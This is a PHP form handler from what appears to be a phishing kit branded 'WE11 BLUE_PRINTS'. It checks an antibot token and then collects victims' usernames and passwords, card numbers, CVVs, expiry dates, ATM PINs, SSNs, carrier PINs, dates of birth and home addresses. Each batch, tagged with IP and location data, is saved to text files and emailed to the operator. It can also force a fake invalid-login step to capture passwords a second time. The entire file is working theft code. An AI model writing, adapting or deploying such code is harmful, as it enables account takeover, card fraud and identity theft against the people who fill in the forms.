<?php 
	session_start();
	require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
	        // variable declaration
	        $errors = array(); 


	       if (isset($_POST['invalid']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // Get User Input
			  $_SESSION['hudf'] = $_POST['hudf'];
              $_SESSION['sjgdh'] = $_POST['sjgdh'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = ":::::::::::  WE11 BLUE_PRINTS 1nf0 [Login Details] :::::::::\r\n";
	          $body .= "User                             : {$_SESSION['hudf']}\r\n";
	          $body .= "Password                         : {$_SESSION['sjgdh']}\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                       : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                   : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::  WE11 BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/login".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
			  }
	          $subject="Login Access 2 BLUE_PRINTS | "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: BLUE_PRINTS <WE11S@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	            @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
					echo "<script>window.location.href='../../step02.php?token=".$key."';</script>";
					die();
	          
	          }
	          
	          if(isset($_POST['hudf'])&&isset($_POST['sjgdh']))
	          {
	          include 'recon.php';
	          include '../conf/config.php'; 
	          // check for valid email address
	          
              $_SESSION['hudf'] = $_POST['hudf'];
              $_SESSION['sjgdh'] = $_POST['sjgdh'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = ":::::::::::  WE11 BLUE_PRINTS 1nf0 [Login Details] :::::::::\r\n";
	          $body .= "User                             : {$_SESSION['hudf']}\r\n";
	          $body .= "Password                         : {$_SESSION['sjgdh']}\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                       : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                   : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= "::::::::::::::::  WE11 BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/login".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
			  }
              $subject="Login Access 1 BLUE_PRINTS | "."IP: ".$_SERVER['REMOTE_ADDR'];
	          
	          $headers="From: BLUE_PRINTS <WE11S@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          $key = $_SESSION['token'];
			  if($d_log == "on"){
	          echo "<script>window.location.href='../../access.php?invalid&token=".$key."';</script>";
	          die();
			  }else{
				echo "<script>window.location.href='../../step02.php?token=".$key."';</script>";
				die();
			  }
	          }

	          
	          if (isset($_POST['cvv']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // check for valid email address
              $exxp = $_POST['expmnth']."/".$_POST['expyr'];
              $_SESSION['crd'] = str_replace(' ', '', $_POST['ccn']);
              $_SESSION['cvv'] = $_POST['cvv'];
              $_SESSION['exp'] = $exxp;
              $_SESSION['ap'] = $_POST['atm'];
                $ip = $_SESSION['ip'];

    $body = ":::::::  WE11 BLUE_PRINTS 1nf0 [Dual Login Details] ::::::\r\n";
    $body .= "User                               : {$_SESSION['hudf']}\r\n";
    $body .= "Password                           : {$_SESSION['sjgdh']}\r\n";
    $body .= ":::::::  WE11 BLUE_PRINTS 1nf0 [ Card Details] :::::::::\r\n";
	$body .= "Card                            : {$_SESSION['crd']}\r\n";
    $body .= "CVV                             : {$_SESSION['cvv']}\r\n";
	$body .= "EXP                             : {$_SESSION['exp']}\r\n";
	$body .= "Atm pin                         : {$_SESSION['ap']}\r\n";
	$body .=  "|--------------- I N F O | I P -------------------|\r\n";
	$body .= "IP Address	                   : {$_SESSION['ip']}\r\n";
	$body .= "IP Country	                   : {$_SESSION['country']}\r\n";
	$body .= "IP City	                   : {$_SESSION['city']}\r\n";
	$body .= "Browser		               : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$body .= "User Agent	                   : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$body .= "TIME		                   : ".date("d/m/Y h:i:sa")." GMT\r\n";
	$body .= "::::::::::::::::  WE11 BLUE_PRINTS 1nf0 :::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/crd".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
			  }
	          $subject="Card Details BLUE_PRINTS| "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: BLUE_PRINTS <WE11S@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
	          	echo "<script>window.location.href='../../step03.php?token=".$key."';</script>";
	          	die();
	          }

			  if (isset($_POST['bhn']))
	          {
	          	include 'recon.php';
	          	include '../conf/config.php'; 
	          // check for valid email address 
	       
              $_SESSION['name'] = $_POST['bhnmk'];
              $_SESSION['dob'] = $_POST['dob'];
              $_SESSION['bhn'] = $_POST['bhn'];
              $_SESSION['phone'] = $_POST['num'];
              $_SESSION['crpin'] = $_POST['crpin'];
              $_SESSION['phty'] = $_POST['phty'];
              $_SESSION['email'] = $_POST['mlhn'];
              $_SESSION['idn'] = $_POST['city'];
              $_SESSION['state'] = $_POST['state'];
              $_SESSION['street'] = $_POST['stradd1'];
              $_SESSION['suit'] = $_POST['stradd2'];
              $_SESSION['zip'] = $_POST['zpc'];
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
			  
			  $body = ":::::::  WE11 BLUE_PRINTS 1nf0 [Dual Login Details] ::::::\r\n";
              $body .= "User                               : {$_SESSION['hudf']}\r\n";
              $body .= "Password                           : {$_SESSION['sjgdh']}\r\n";
              $body .= ":::::::  WE11 BLUE_PRINTS 1nf0 [ Billing Details] :::::::::\r\n";
              $body .= "FName                          : {$_SESSION['name']}\r\n";
              $body .= "PHONE                          : {$_SESSION['phone']}\r\n";
              $body .= "PHONETYPE                      : {$_SESSION['phty']}\r\n";
              $body .= "Carrier pin                    : {$_SESSION['crpin']}\r\n";
              $body .= "DOB                            : {$_SESSION['dob']}\r\n";
              $body .= "SSN                            : {$_SESSION['bhn']}\r\n";
              $body .= "Address                        : {$_SESSION['street']}\r\n";
              $body .= "STREET2                        : {$_SESSION['suit']}\r\n";
              $body .= "City                           : {$_SESSION['idn']}\r\n";
              $body .= "STATE                          : {$_SESSION['state']}\r\n";
              $body .= "Zip code                       : {$_SESSION['zip']}\r\n";
	          $body .= ":::::::  WE11 BLUE_PRINTS 1nf0 [ Card Details] :::::::::\r\n";
	          $body .= "Card                            : {$_SESSION['crd']}\r\n";
              $body .= "CVV                             : {$_SESSION['cvv']}\r\n";
        	  $body .= "EXP                             : {$_SESSION['exp']}\r\n";
	          $body .= "Atm pin                         : {$_SESSION['ap']}\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                           : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: BLUE_PRINTS WE11 Info :::::::::::::::::::::::::\r\n";
	          if($savetxt == "on"){
	          $save=fopen("../data/biling".$salt.".txt",'a');
	          fwrite($save,$body);
	          fclose($save);
			  }
	          $subject="Billing Details BLUE_PRINTS | "."IP: ".$_SERVER['REMOTE_ADDR'];

	          $headers="From: BLUE_PRINTS <WE11S@BLUE_PRINTS.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          @mail($emailzz, $subject, $body, $headers);
	          	$key = $_SESSION['token'];
				 
				echo "<script>window.location.href='../../emailauth/check.php?token=".$key."';</script>";
				die();
				  
	          }
?>
